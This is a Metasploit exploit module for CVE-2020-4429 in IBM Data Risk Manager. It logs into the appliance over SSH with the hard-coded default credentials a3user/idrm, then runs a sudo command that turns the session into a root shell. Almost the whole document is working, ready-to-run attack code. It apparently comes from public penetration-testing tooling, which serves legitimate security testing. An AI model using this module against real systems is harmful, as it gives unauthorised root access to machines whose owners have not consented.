# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SSH

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;IBM Data Risk Manager a3user Default Password&#039;,
        &#039;Description&#039; => %q{
          This module abuses a known default password in IBM Data Risk Manager. The &#039;a3user&#039;
          has the default password &#039;idrm&#039; and allows an attacker to log in to the virtual appliance
          via SSH. This can be escalate to full root access, as &#039;a3user&#039; has sudo access with the default password.
          At the time of disclosure, this is a 0day. Versions <= 2.0.3 are confirmed to be
          affected, and the latest 2.0.6 is most likely affected too.
        },
        &#039;License&#039; => MSF_LICENSE,
        &#039;Author&#039; =>
          [
            &#039;Pedro Ribeiro <pedrib[at]gmail.com>&#039; # Vulnerability discovery and Metasploit module
          ],
        &#039;References&#039; =>
          [
            [ &#039;CVE&#039;, &#039;2020-4429&#039; ], # insecure default password
            [ &#039;URL&#039;, &#039;https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md&#039; ],
            [ &#039;URL&#039;, &#039;https://seclists.org/fulldisclosure/2020/Apr/33&#039; ]
          ],
        &#039;Payload&#039; =>
          {
            &#039;Compat&#039; => {
              &#039;PayloadType&#039; => &#039;cmd_interact&#039;,
              &#039;ConnectionType&#039; => &#039;find&#039;
            }
          },
        &#039;Platform&#039; => &#039;unix&#039;,
        &#039;Arch&#039; => ARCH_CMD,
        &#039;Targets&#039; =>
          [
            [ &#039;IBM Data Risk Manager <= 2.0.3 (<= 2.0.6 possibly affected)&#039;, {} ]
          ],
        &#039;Privileged&#039; => true,
        &#039;DefaultTarget&#039; => 0,
        &#039;DisclosureDate&#039; => &#039;2020-04-21&#039;
      )
    )

    register_options(
      [
        Opt::RPORT(22),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;Username to login with&#039;, &#039;a3user&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password to login with&#039;, &#039;idrm&#039;])
      ]
    )

    register_advanced_options(
      [
        OptBool.new(&#039;SSH_DEBUG&#039;, [false, &#039;Enable SSH debugging output (Extreme verbosity!)&#039;, false]),
        OptInt.new(&#039;SSH_TIMEOUT&#039;, [false, &#039;Specify the maximum time to negotiate a SSH session&#039;, 30])
      ]
    )
  end

  def on_new_session(client)
    print_status("#{peer} - Escalating privileges to root, please wait a few seconds...")
    # easiest way I found to get passwordless root, not sure if there&#039;s a shorter command
    client.shell_command_token("echo #{datastore[&#039;PASSWORD&#039;]} | sudo -S &#039;echo 2>/dev/null&#039;; sudo /bin/sh")
    print_good("#{peer} - Done, enjoy your root shell!")
  end

  def rhost
    datastore[&#039;RHOST&#039;]
  end

  def rport
    datastore[&#039;RPORT&#039;]
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def do_login(user, pass)
    factory = ssh_socket_factory
    opts = {
      auth_methods: [&#039;password&#039;, &#039;keyboard-interactive&#039;],
      port: rport,
      use_agent: false,
      config: false,
      password: pass,
      proxy: factory,
      non_interactive: true,
      verify_host_key: :never
    }

    opts.merge!(verbose: :debug) if datastore[&#039;SSH_DEBUG&#039;]

    begin
      ssh =
        ::Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
          Net::SSH.start(rhost, user, opts)
        end
    rescue Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} SSH - Connection error")
    rescue Net::SSH::Disconnect, ::EOFError
      fail_with(Failure::Unknown, "#{peer} SSH - Disconnected during negotiation")
    rescue ::Timeout::Error
      fail_with(Failure::Unknown, "#{peer} SSH - Timed out during negotiation")
    rescue Net::SSH::AuthenticationFailed
      fail_with(Failure::Unknown, "#{peer} SSH - Failed authentication")
    rescue Net::SSH::Exception => e
      fail_with(Failure::Unknown, "#{peer} SSH Error: #{e.class} : #{e.message}")
    end

    return Net::SSH::CommandStream.new(ssh) if ssh

    nil
  end

  def exploit
    user = datastore[&#039;USERNAME&#039;]
    pass = datastore[&#039;PASSWORD&#039;]

    print_status("#{peer} - Attempting to log in to the IBM Data Risk Manager appliance...")
    conn = do_login(user, pass)
    if conn
      print_good("#{peer} - Login successful (#{user}:#{pass})")
      handler(conn.lsock)
    end
  end
end

